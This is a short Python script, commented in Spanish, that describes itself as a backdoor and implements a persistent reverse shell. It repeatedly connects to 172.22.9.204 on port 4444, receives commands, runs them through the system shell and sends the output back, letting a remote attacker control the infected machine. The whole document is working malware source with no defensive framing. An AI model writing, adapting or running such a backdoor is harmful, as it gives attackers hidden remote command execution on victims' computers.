#back dooor que se queda en segundo plano mandando peticiones a un servidor 172.22.9.204 en el puerto 4444
# para que el atacante pueda controlar la maquina infectada a traves de una shell remota podiendo ejecutar comandos usar el tab etc.

import socket
import subprocess
import os
import time

def connect():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("172.22.9.204", 4444))
            while True:
                command = s.recv(1024)
                if 'terminate' in command.decode('utf-8'):  # decode the bytes to string
                    s.close()
                    return  # Sal del bucle interno
                else:
                    CMD = subprocess.Popen(command.decode('utf-8'), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    s.send(CMD.stdout.read())
                    s.send(CMD.stderr.read())
        except socket.error:
            time.sleep(1)  # Espera 5 segundos antes de intentar volver a conectarse

def main():
    while True:
        connect()

main()